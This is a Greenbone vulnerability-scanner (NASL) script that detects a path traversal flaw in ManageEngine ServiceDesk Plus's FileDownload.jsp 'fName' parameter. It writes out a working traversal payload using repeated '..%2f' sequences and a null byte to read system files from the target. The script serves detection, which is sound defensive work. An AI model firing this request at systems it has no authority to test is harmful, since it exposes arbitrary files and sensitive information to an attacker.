# SPDX-FileCopyrightText: 2015 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:zohocorp:manageengine_servicedesk_plus";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.806510");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2015-10-21 13:10:53 +0530 (Wed, 21 Oct 2015)");
  script_tag(name:"qod_type", value:"remote_vul");
  script_name("ManageEngine ServiceDesk Plus 'fName' Parameter Path Traversal Vulnerability");

  script_tag(name:"summary", value:"ManageEngine ServiceDesk is prone to a path traversal vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request
  and check whether it is able to read arbitrary files or not.");

  script_tag(name:"insight", value:"The flaw is due to insufficient sanitization
  of user-supplied input via 'fName' parameter in 'FileDownload.jsp'.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to read arbitrary files and to obtain sensitive information which
  may lead to further attacks.");

  script_tag(name:"affected", value:"ManageEngine ServiceDesk Plus version
  9.1 build 9110 and previous versions.");

  script_tag(name:"solution", value:"Upgrade to ManageEngine ServiceDesk Plus
  version 9.1 build 9111 or later.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/38395");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_manageengine_servicedesk_plus_consolidation.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 8080);
  script_mandatory_keys("manageengine/servicedesk_plus/detected");

  exit(0);
}

include("host_details.inc");
include("os_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("traversal_func.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

files = traversal_files();

foreach pattern(keys(files)) {

  file = files[pattern];
  file = str_replace(find:"/", string:file, replace:"%2f");

  url = dir + '/workorder/FileDownload.jsp?module=support&fName=' + crap(data:"..%2f", length:7*5) + file + '%00';

  if(http_vuln_check(port:port, url:url, check_header:TRUE, pattern:pattern)) {
    report = http_report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
